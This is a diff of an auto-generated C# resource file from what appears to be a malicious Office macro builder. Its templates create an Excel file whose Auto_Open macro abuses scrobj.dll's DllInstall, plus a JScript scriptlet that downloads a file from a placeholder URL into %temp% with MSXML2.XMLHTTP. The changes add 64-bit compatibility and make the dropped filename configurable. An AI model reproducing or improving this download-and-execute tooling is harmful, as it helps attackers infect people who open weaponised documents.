@@ -64,8 +64,11 @@ namespace Macro.Properties {
         ///   查找类似 $global:FullName = &quot;$env:userprofile\Desktop\&quot;+ &quot;qwqdanchun.xls&quot;
         ///
         ///$Code = @&quot;
-        ///Private Declare Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
-        ///
+        ///#If VBA7 And Win64 Then
+        ///    Private Declare PtrSafe Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
+        ///#Else
+        ///    Private Declare Function DllInstall Lib &quot;scrobj.dll&quot; (ByVal bInstall As Boolean, ByRef pszCmdLine As Any) As Long
+        ///#End If
         ///Sub Auto_Open()
         ///    DllInstall False, ByVal StrPtr(&quot; 的本地化字符串。
         /// </summary>
@@ -106,7 +109,7 @@ namespace Macro.Properties {
         ///    &lt;![CDATA[
         ///	var WSHShell = new ActiveXObject(&quot;WScript.Shell&quot;);
         ///path = WSHShell.ExpandEnvironmentStrings(&quot;%temp%&quot;);
-        ///var filepath = path+&quot;/qwqdanchun&quot;;
+        ///var filepath = path+&quot;/%filename%&quot;;
         ///var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);
         ///xhr.open(&quot;GET&quot;,&quot;%qwqdanchun%&quot;, false);
         ///xhr.send();
